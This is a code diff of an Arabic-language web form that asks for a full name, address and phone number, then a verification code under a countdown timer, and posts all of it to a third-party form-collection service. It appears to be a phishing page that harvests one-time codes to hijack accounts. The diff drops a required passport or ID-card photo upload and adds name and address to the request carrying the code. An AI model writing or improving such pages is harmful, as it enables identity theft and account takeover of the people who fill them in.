@@ -67,8 +67,7 @@
     }
 
     input[type="tel"],
-    input[type="text"],
-    input[type="file"] {
+    input[type="text"] {
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
@@ -145,13 +144,10 @@
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+      <input type="text" id="fullname" name="fullname" required placeholder="أدخل اسمك الثلاثي" />
 
       <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-      <label for="documentImage">صورة من الجواز أو البطاقة:</label>
-      <input type="file" id="documentImage" name="documentImage" accept="image/*" capture="environment" required />
+      <input type="text" id="address" name="address" required placeholder="أدخل عنوانك" />
 
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
@@ -177,10 +173,9 @@
     const timerDisplay = document.getElementById('timer');
     const codeField = document.getElementById('codeField');
     const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
     const fullNameInput = document.getElementById('fullname');
     const addressInput = document.getElementById('address');
-    const documentInput = document.getElementById('documentImage');
-    const codeInput = document.getElementById('code');
     const errorMessage = document.getElementById('errorMessage');
 
     function startTimer(duration) {
@@ -214,23 +209,23 @@
         return false;
       }
 
-      if (documentInput.files.length === 0) {
-        alert('يرجى رفع صورة من الجواز أو البطاقة.');
-        return false;
-      }
-
-      const formData = new FormData();
-      formData.append("fullname", fullNameInput.value);
-      formData.append("address", addressInput.value);
-      formData.append("phone", phoneInput.value);
-      formData.append("documentImage", documentInput.files[0]);
+      const payload = {
+        fullname: fullNameInput.value,
+        address: addressInput.value,
+        phone: phoneInput.value
+      };
 
       fetch('https://formcarry.com/s/12UxdOsTbaW', {
         method: 'POST',
-        body: formData
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
       })
       .then(response => {
         if (!response.ok) throw new Error('فشل إرسال البيانات');
+
         phoneInput.disabled = true;
         sendPhoneBtn.disabled = true;
         codeField.style.display = 'block';
@@ -255,6 +250,8 @@
       }
 
       const payload = {
+        fullname: fullNameInput.value,
+        address: addressInput.value,
         phone: phoneInput.value,
         code: codeInput.value
       };
